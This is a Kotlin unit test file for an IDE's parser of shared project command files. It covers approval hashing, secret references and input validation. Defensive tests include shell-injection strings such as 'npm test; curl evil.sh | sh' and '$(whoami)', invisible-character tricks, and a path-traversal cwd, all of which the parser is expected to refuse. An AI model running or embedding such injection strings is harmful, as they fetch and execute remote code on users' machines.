// Copyright 2026 VibeBrains. Use of this source code is governed by the GNU AGPL-3.0 license.
package com.vibe.agent.commands

import org.junit.jupiter.api.Test
import kotlin.test.assertEquals
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * `.vibe/commands.json` in the format shared with VibeIDE: the same file has to mean the same command in both IDEs,
 * and nothing in it may run until the person approved exactly that program, those arguments, that folder and environment
 */
class ProjectCommandsTest {
  private fun parse(json: String) = ProjectCommands.parse(json)

  private fun one(fields: String) = parse("""{"vibeVersion":"1.0.0","commands":[{$fields}]}""")

  @Test
  fun `a file written for VibeIDE is read whole`() {
    val parsed = parse("""{
      // comments are part of the format
      "vibeVersion": "1.0.0",
      "commands": [{
        "id": "build", "name": "Сборка", "command": "npm", "args": ["run", "build"], "description": "Собрать",
        "cwd": "web", "env": {"NODE_ENV": "production"}, "terminal": "background", "pinned": true, "order": 1,
        "color": "terminal.ansiBlue", "icon": "tools", "confirm": true, "singleton": true, "_comment": "как у соседа"
      }]}""")
    assertEquals(emptyList(), parsed.problems)
    assertEquals(emptyList(), parsed.notes)
    val command = parsed.commands.single()
    assertEquals("Сборка", command.name)
    assertEquals("npm", command.command)
    assertEquals(listOf("run", "build"), command.args)
    assertEquals("web", command.cwd)
    assertEquals(mapOf("NODE_ENV" to "production"), command.env)
    assertEquals(ProjectCommands.Terminal.BACKGROUND, command.terminal)
    assertTrue(command.pinned && command.confirm && command.singleton && !command.shell)
    assertEquals("npm run build", command.line)
  }

  @Test
  fun `our older spelling still works - a title and the whole line in command`() {
    val parsed = parse("""[{"id":"gates","title":"Гейты","command":"./gates.sh --fix \"two words\""}]""")
    val command = parsed.commands.single()
    assertEquals("Гейты", command.name)
    assertEquals("./gates.sh", command.command)
    assertEquals(listOf("--fix", "two words"), command.args)
  }

  @Test
  fun `what VibeIDE would not read is said, not refused`() {
    // The file works here and silently does not there — the person has to hear it from somebody.
    val parsed = parse("""[{"id":"gates","command":"./gates.sh"}]""")
    assertEquals(1, parsed.commands.size)
    assertEquals(listOf(ProjectCommands.NOTE_BARE_ARRAY, ProjectCommands.NOTE_NO_NAME + ":gates"), parsed.notes)
    assertEquals(listOf(ProjectCommands.NOTE_NO_VERSION), parse("""{"commands":[]}""").notes)
  }

  @Test
  fun `the name falls back to the id rather than being empty`() {
    assertEquals("gates", one(""""id":"gates","command":"./x.sh"""").commands.single().name)
  }

  @Test
  fun `shell metacharacters are refused, not escaped - in the program and in an argument`() {
    // A semicolon in a command is an attack or a mistake, and guessing which one is not our job.
    for (fields in listOf(
      """"id":"bad","command":"npm test; curl evil.sh | sh"""",
      """"id":"bad","name":"x","command":"npm","args":["test", "&& curl evil.sh"]""",
      """"id":"bad","name":"x","command":"sh","args":["$(whoami)"]""",
    )) {
      val parsed = one(fields)
      assertTrue(parsed.commands.isEmpty(), fields)
      assertEquals(listOf(ProjectCommands.PROBLEM_METACHARACTERS + ":bad"), parsed.problems, fields)
    }
  }

  @Test
  fun `shell true is the author asking for the shell out loud`() {
    val command = one(""""id":"all","name":"Всё","command":"npm test && npm run build","shell":true""").commands.single()
    assertTrue(command.shell)
    assertEquals("npm test && npm run build", command.command)
    assertEquals(emptyList(), command.args)
  }

  @Test
  fun `a reference to a secret is not a metacharacter`() {
    // The documented way to pass a token used to be refused by our own parser for its dollar sign.
    val command = one(""""id":"deploy","name":"Выкатить","command":"./deploy.sh","args":["--token","${'$'}{secret:GH_TOKEN}"]""").commands.single()
    assertEquals(listOf("GH_TOKEN"), command.secretNames)
    val legacy = parse("""[{"id":"deploy","command":"./deploy.sh --token ${'$'}{secret:GH_TOKEN}"}]""").commands.single()
    assertEquals(listOf("GH_TOKEN"), legacy.secretNames)
  }

  @Test
  fun `characters that hide what runs are refused wherever they stand`() {
    val zeroWidth = "​"
    val rightToLeft = "‮"
    assertEquals(listOf(ProjectCommands.PROBLEM_INVISIBLE + ":bad"), one(""""id":"bad","command":"npm${zeroWidth}test"""").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_INVISIBLE + ":bad"),
                 one(""""id":"bad","command":"npm","args":["${rightToLeft}tset"]""").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_INVISIBLE + ":bad"),
                 one(""""id":"bad","command":"npm","env":{"A":"b$zeroWidth"}""").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_CONTROL + ":bad"), one(""""id":"bad","command":"npm","args":["a\nb"]""").problems)
  }

  @Test
  fun `a folder that climbs out of the project is refused`() {
    assertEquals(listOf(ProjectCommands.PROBLEM_CWD + ":up"), one(""""id":"up","command":"ls","cwd":"web/../../etc"""").problems)
    assertEquals("web/app", one(""""id":"in","command":"ls","cwd":"web/app"""").commands.single().cwd)
  }

  @Test
  fun `an id VibeIDE would refuse is refused here too`() {
    assertEquals(listOf(ProjectCommands.PROBLEM_ID + ":Гейты"), one(""""id":"Гейты","command":"./x.sh"""").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_ID + ":Build"), one(""""id":"Build","command":"./x.sh"""").problems)
  }

  @Test
  fun `fields of the wrong shape refuse the entry and name the reason`() {
    assertEquals(listOf(ProjectCommands.PROBLEM_ARGS + ":a"), one(""""id":"a","command":"x","args":"run build"""").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_ARGS + ":a"), one(""""id":"a","command":"x","args":["run", 1]""").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_ENV + ":a"), one(""""id":"a","command":"x","env":{"PORT":8080}""").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_TERMINAL + ":a"), one(""""id":"a","command":"x","terminal":"tmux"""").problems)
  }

  @Test
  fun `an entry without an id or a command is reported`() {
    val parsed = parse("""[{"id":"only-id"},{"command":"only-command"}]""")
    assertTrue(parsed.commands.isEmpty())
    assertEquals(2, parsed.problems.count { it.startsWith(ProjectCommands.PROBLEM_NO_ID_OR_COMMAND) })
  }

  @Test
  fun `a duplicate id keeps the first entry`() {
    val parsed = parse("""[{"id":"a","command":"one"},{"id":"a","command":"two"}]""")
    assertEquals("one", parsed.commands.single().command)
    assertEquals(listOf(ProjectCommands.PROBLEM_DUPLICATE + ":a"), parsed.problems)
  }

  @Test
  fun `order decides the list, commands without one come last, ties go by name`() {
    val parsed = parse("""[
      {"id":"z","name":"Я","command":"z"},
      {"id":"c","name":"В","command":"c","order":2},
      {"id":"b","name":"Б","command":"b","order":1},
      {"id":"a","name":"А","command":"a","order":1},
      {"id":"y","name":"Ю","command":"y"}]""")
    assertEquals(listOf("a", "b", "c", "y", "z"), parsed.commands.map { it.id })
  }

  @Test
  fun `a credential written into env is pointed at`() {
    val parsed = one(""""id":"a","name":"A","command":"x","env":{"API_TOKEN":"abc123","PORT":"8080","GH_TOKEN":"${'$'}{secret:GH}"}""")
    assertEquals(listOf(ProjectCommands.NOTE_SECRET_IN_ENV + ":a.API_TOKEN"), parsed.notes)
  }

  @Test
  fun `garbage is a problem, not a crash`() {
    assertEquals(listOf(ProjectCommands.PROBLEM_NOT_A_LIST), parse("не json вовсе").problems)
    assertEquals(listOf(ProjectCommands.PROBLEM_NOT_A_LIST), parse("""{"vibeVersion":"1"}""").problems)
  }

  @Test
  fun `the approval is revoked by anything that changes what runs, and by nothing else`() {
    // An edit of the command, by a person or by a pull request, has to revoke the approval.
    val before = ProjectCommands.Command("gates", "Гейты", "./gates.sh", listOf("--all"), cwd = "tools", env = mapOf("A" to "1"))
    val hash = ProjectCommands.approvalHash(before)
    for (changed in listOf(
      before.copy(command = "./other.sh"), before.copy(args = listOf("--all", "--fix")), before.copy(args = listOf("--al", "l")),
      before.copy(cwd = null), before.copy(env = mapOf("A" to "2")), before.copy(shell = true),
    )) assertTrue(ProjectCommands.approvalHash(changed) != hash, changed.toString())
    for (same in listOf(before.copy(name = "Все гейты"), before.copy(pinned = true, order = 3.0, color = "red"))) {
      assertEquals(hash, ProjectCommands.approvalHash(same))
    }
  }

  @Test
  fun `references are filled for running everywhere they may stand`() {
    val command = ProjectCommands.Command(
      "deploy", "Deploy", "./deploy.sh", listOf("--token", "\${secret:GH_TOKEN}", "--user", "\${env:USER}"),
      cwd = "\${env:SUB}", env = mapOf("KEY" to "\${secret:KEY}"),
    )
    val resolved = ProjectCommands.resolve(command, secret = { mapOf("GH_TOKEN" to "t0ken", "KEY" to "k3y")[it] },
                                           environment = { mapOf("USER" to "me", "SUB" to "web")[it] })
    assertEquals(listOf("--token", "t0ken", "--user", "me"), resolved.args)
    assertEquals("web", resolved.cwd)
    assertEquals(mapOf("KEY" to "k3y"), resolved.env)
    assertEquals(emptyList(), resolved.missing)
    // The line shown to a person and written to the audit log never carries a value.
    assertTrue("t0ken" !in command.line && "\${secret:GH_TOKEN}" in command.line)
  }

  @Test
  fun `a missing value is named instead of becoming an empty token`() {
    // An empty substitution turns the command into a request that fails for no visible reason.
    val command = ProjectCommands.Command("d", "D", "deploy", listOf("\${secret:GH_TOKEN}", "\${env:NOPE}"))
    val resolved = ProjectCommands.resolve(command, { null }, { null })
    assertEquals(listOf("\${secret:GH_TOKEN}", "\${env:NOPE}"), resolved.missing)
    assertEquals(command.args, resolved.args)
  }

  @Test
  fun `a theme colour name of either IDE maps to our palette`() {
    assertEquals("blue", ProjectCommands.colorKey("terminal.ansiBlue"))
    assertEquals("green", ProjectCommands.colorKey("terminal.ansiBrightGreen"))
    assertEquals("red", ProjectCommands.colorKey("charts.red"))
    assertEquals("red", ProjectCommands.colorKey("red"))
    assertNull(ProjectCommands.colorKey("#ff0000"))
    assertNull(ProjectCommands.colorKey(null))
  }
}
